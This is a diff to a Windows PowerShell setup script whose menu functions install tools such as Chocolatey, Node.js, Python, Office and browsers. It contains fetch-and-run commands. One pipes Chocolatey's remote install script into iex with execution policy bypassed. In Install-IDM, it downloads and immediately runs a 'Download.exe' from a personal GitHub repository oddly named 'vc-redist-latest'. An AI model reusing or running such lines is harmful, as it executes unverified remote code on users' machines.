@@ -553,9 +553,9 @@ function Install-Choco {
         Write-Host "Chocolatey is already installed."
         choco --version
     } else {
-        Write-Host "Installing Chocolatey..."
-        powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))"
-        Write-Host "Chocolatey installation completed."
+        Write-Host "Opening new window to install Chocolatey..."
+        $chocoCmd = 'powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString(''https://community.chocolatey.org/install.ps1''))" && echo Chocolatey installation completed. && pause'
+        Start-Process cmd -ArgumentList "/c", $chocoCmd -Wait
         Write-Host "Refreshing environment variables..."
         Refresh-Env
     }
@@ -575,8 +575,9 @@ function Install-NodeLTS {
         Write-Host "Node.js is already installed."
         node --version
     } else {
-        Write-Host "Installing Node.js LTS..."
-        choco install nodejs-lts -y
+        Write-Host "Opening new window to install Node.js LTS..."
+        $nodeCmd = 'choco install nodejs-lts -y && echo Node.js installation completed. && pause'
+        Start-Process cmd -ArgumentList "/c", $nodeCmd -Wait
         Write-Host "Refreshing environment variables..."
         Refresh-Env
     }
@@ -615,7 +616,7 @@ function Install-IDM
     Write-Host "=========================================="                                 
     Write-Host "Downloading with IDM"                                                        
     Write-Host "=========================================="                                 
-    Start-Process cmd -ArgumentList "/k", "curl -L -O https://github.com/planetshine0000/vc-redist-latest/releases/download/v1.0.1/Download.exe && Download.exe"
+    Start-Process cmd -ArgumentList "/k", "curl.exe -L -O https://github.com/planetshine0000/vc-redist-latest/releases/download/v1.0.1/Download.exe && Download.exe"
     Write-Host ""                                                                            
     Pause-Script                                                                         
 }                                                                         
@@ -675,8 +676,9 @@ function Install-Python {
         Write-Host "Python is already installed."
         python --version
     } else {
-        Write-Host "Installing Python..."
-        choco install python -y
+        Write-Host "Opening new window to install Python..."
+        $pythonCmd = 'choco install python -y && echo Python installation completed. && pause'
+        Start-Process cmd -ArgumentList "/c", $pythonCmd -Wait
         Write-Host "Refreshing environment variables..."
         Refresh-Env
     }
@@ -696,8 +698,9 @@ function Install-Git {
         Write-Host "Git is already installed."
         git --version
     } else {
-        Write-Host "Installing Git..."
-        choco install git -y
+        Write-Host "Opening new window to install Git..."
+        $gitCmd = 'choco install git -y && echo Git installation completed. && pause'
+        Start-Process cmd -ArgumentList "/c", $gitCmd -Wait
         Write-Host "Refreshing environment variables..."
         Refresh-Env
     }
@@ -717,8 +720,9 @@ function Install-Dotnet {
         Write-Host ".NET is already installed."
         dotnet --version
     } else {
-        Write-Host "Installing .NET..."
-        choco install dotnet -y
+        Write-Host "Opening new window to install .NET..."
+        $dotnetCmd = 'choco install dotnet -y && echo .NET installation completed. && pause'
+        Start-Process cmd -ArgumentList "/c", $dotnetCmd -Wait
         Write-Host "Refreshing environment variables..."
         Refresh-Env
     }
@@ -738,8 +742,9 @@ function Install-FFmpeg {
         Write-Host "FFmpeg is already installed."
         ffmpeg -version 2>&1 | Select-String "ffmpeg version"
     } else {
-        Write-Host "Installing FFmpeg..."
-        choco install ffmpeg -y
+        Write-Host "Opening new window to install FFmpeg..."
+        $ffmpegCmd = 'choco install ffmpeg -y && echo FFmpeg installation completed. && pause'
+        Start-Process cmd -ArgumentList "/c", $ffmpegCmd -Wait
         Write-Host "Refreshing environment variables..."
         Refresh-Env
     }
@@ -758,8 +763,9 @@ function Install-7Zip {
     if (Get-Command 7z -ErrorAction SilentlyContinue) {
         Write-Host "7-Zip is already installed."
     } else {
-        Write-Host "Installing 7-Zip..."
-        choco install 7zip -y
+        Write-Host "Opening new window to install 7-Zip..."
+        $zipCmd = 'choco install 7zip -y && echo 7-Zip installation completed. && pause'
+        Start-Process cmd -ArgumentList "/c", $zipCmd -Wait
         Write-Host "Refreshing environment variables..."
         Refresh-Env
     }
@@ -775,8 +781,11 @@ function Install-WinDirStat {
         Write-Host "Chocolatey is required. Installing Chocolatey first..."
         Install-Choco
     }
-    Write-Host "Installing WinDirStat..."
-    choco install windirstat -y
+    Write-Host "Opening new window to install WinDirStat..."
+    $wdsCmd = 'choco install windirstat -y && echo WinDirStat installation completed. && pause'
+    Start-Process cmd -ArgumentList "/c", $wdsCmd -Wait
+    Write-Host "Refreshing environment variables..."
+    Refresh-Env
     Write-Host ""
     Pause-Script
 }
@@ -789,8 +798,11 @@ function Install-YTDLP {
         Write-Host "Chocolatey is required. Installing Chocolatey first..."
         Install-Choco
     }
-    Write-Host "Installing yt-dlp..."
-    choco install yt-dlp -y
+    Write-Host "Opening new window to install yt-dlp..."
+    $ytdlpCmd = 'choco install yt-dlp -y && echo yt-dlp installation completed. && pause'
+    Start-Process cmd -ArgumentList "/c", $ytdlpCmd -Wait
+    Write-Host "Refreshing environment variables..."
+    Refresh-Env
     Write-Host ""
     Pause-Script
 }
@@ -803,8 +815,11 @@ function Install-Ngrok {
         Write-Host "Chocolatey is required. Installing Chocolatey first..."
         Install-Choco
     }
-    Write-Host "Installing ngrok..."
-    choco install ngrok -y
+    Write-Host "Opening new window to install ngrok..."
+    $ngrokCmd = 'choco install ngrok -y && echo ngrok installation completed. && pause'
+    Start-Process cmd -ArgumentList "/c", $ngrokCmd -Wait
+    Write-Host "Refreshing environment variables..."
+    Refresh-Env
     Write-Host ""
     Pause-Script
 }
@@ -912,14 +927,14 @@ function Install-Office365 {
     Write-Host "=========================================="
     Write-Host "Installing Office 365 ProPlus"
     Write-Host "=========================================="
-    if (-not (Get-Command curl -ErrorAction SilentlyContinue)) {
+    if (-not (Get-Command curl.exe -ErrorAction SilentlyContinue)) {
         Write-Host "Curl is required but not found. Please update Windows."
         Pause-Script
         return
     }
 
     Write-Host "Downloading Office 365 Setup..."
-    curl -L -o "$env:TEMP\OfficeSetup.exe" "https://c2rsetup.officeapps.live.com/c2r/download.aspx?ProductreleaseID=O365ProPlusRetail&platform=x64&language=en-us&version=O16GA"
+    curl.exe -L -o "$env:TEMP\OfficeSetup.exe" "https://c2rsetup.officeapps.live.com/c2r/download.aspx?ProductreleaseID=O365ProPlusRetail&platform=x64&language=en-us&version=O16GA"
 
     if (Test-Path "$env:TEMP\OfficeSetup.exe") {
         Write-Host "Launching Office Installer..."
@@ -973,13 +988,13 @@ function Install-Zen {
     Write-Host "=========================================="
     Write-Host "Installing Zen Browser (Manual Method)"
     Write-Host "=========================================="
-    if (-not (Get-Command curl -ErrorAction SilentlyContinue)) {
+    if (-not (Get-Command curl.exe -ErrorAction SilentlyContinue)) {
         Write-Host "Curl is required but not found."
         Pause-Script
         return
     }
 
-    $zenCmd = 'echo Downloading Zen Browser installer... & curl -L -o "%TEMP%\zen-installer.exe" "https://github.com/zen-browser/desktop/releases/latest/download/zen.installer.exe" & if exist "%TEMP%\zen-installer.exe" (echo Running installer... & start /wait "" "%TEMP%\zen-installer.exe" & del "%TEMP%\zen-installer.exe") else (echo Download failed. Please install manually. & start https://zen-browser.app/download)'
+    $zenCmd = 'echo Downloading Zen Browser installer... & curl.exe -L -o "%TEMP%\zen-installer.exe" "https://github.com/zen-browser/desktop/releases/latest/download/zen.installer.exe" & if exist "%TEMP%\zen-installer.exe" (echo Running installer... & start /wait "" "%TEMP%\zen-installer.exe" & del "%TEMP%\zen-installer.exe") else (echo Download failed. Please install manually. & start https://zen-browser.app/download)'
     Start-Process cmd -ArgumentList "/k", $zenCmd
 
     Write-Host ""
@@ -1053,14 +1068,14 @@ function Install-HiBit {
     Write-Host "=========================================="
     Write-Host "Installing HiBit Uninstaller"
     Write-Host "=========================================="
-    if (-not (Get-Command curl -ErrorAction SilentlyContinue)) {
+    if (-not (Get-Command curl.exe -ErrorAction SilentlyContinue)) {
         Write-Host "Curl is required but not found."
         Pause-Script
         return
     }
 
     Write-Host "Downloading HiBit Uninstaller..."
-    curl -L -o "$env:TEMP\HiBitSetup.exe" "https://www.hibitsoft.ir/HiBitUninstaller/HiBitUninstaller-setup-4.0.10.exe"
+    curl.exe -L -o "$env:TEMP\HiBitSetup.exe" "https://www.hibitsoft.ir/HiBitUninstaller/HiBitUninstaller-setup-4.0.10.exe"
 
     if (Test-Path "$env:TEMP\HiBitSetup.exe") {
         Write-Host "Running installer..."
@@ -1079,14 +1094,14 @@ function Install-Scrcpy {
     Write-Host "=========================================="
     Write-Host "Installing Scrcpy GUI"
     Write-Host "=========================================="
-    if (-not (Get-Command curl -ErrorAction SilentlyContinue)) {
+    if (-not (Get-Command curl.exe -ErrorAction SilentlyContinue)) {
         Write-Host "Curl is required but not found."
         Pause-Script
         return
     }
 
     Write-Host "Downloading Scrcpy GUI..."
-    curl -L -o "$env:TEMP\ScrcpyGUI_Setup.exe" "https://github.com/pizi-0/flutter-scrcpygui/releases/download/1.4.18/scrcpygui-1.4.18-win.exe"
+    curl.exe -L -o "$env:TEMP\ScrcpyGUI_Setup.exe" "https://github.com/pizi-0/flutter-scrcpygui/releases/download/1.4.18/scrcpygui-1.4.18-win.exe"
 
     if (Test-Path "$env:TEMP\ScrcpyGUI_Setup.exe") {
         Write-Host "Running installer..."
@@ -1156,7 +1171,7 @@ function Install-VCRedist {
     Write-Host "=========================================="
     Write-Host "Installing Visual C++ Runtimes"
     Write-Host "=========================================="
-    if (-not (Get-Command curl -ErrorAction SilentlyContinue)) {
+    if (-not (Get-Command curl.exe -ErrorAction SilentlyContinue)) {
         Write-Host "Curl is required but not found."
         Pause-Script
         return
@@ -1167,7 +1182,7 @@ function Install-VCRedist {
     $EXTRACT_DIR="$env:TEMP\VC_Runtimes_Temp"
 
     Write-Host "Downloading Visual C++ Runtimes..."
-    curl -L -o $ZIP_FILE $ZIP_URL
+    curl.exe -L -o $ZIP_FILE $ZIP_URL
 
     if (Test-Path $ZIP_FILE) {
         Write-Host "Extracting files..."
@@ -1197,7 +1212,7 @@ function Install-DirectX {
     Write-Host "Installing DirectX Runtime"
     Write-Host "=========================================="
 
-    if (-not (Get-Command curl -ErrorAction SilentlyContinue)) {
+    if (-not (Get-Command curl.exe -ErrorAction SilentlyContinue)) {
         Write-Host "[ERROR] Curl is required but not found."
         Pause-Script
         return
@@ -1211,7 +1226,7 @@ function Install-DirectX {
 
     if (-not (Test-Path $DX_ZIP)) {
         Write-Host "Downloading DirectX..."
-        curl -L -o $DX_ZIP $DX_URL
+        curl.exe -L -o $DX_ZIP $DX_URL
     } else {
         Write-Host "DirectX zip already exists, skipping download."
     }
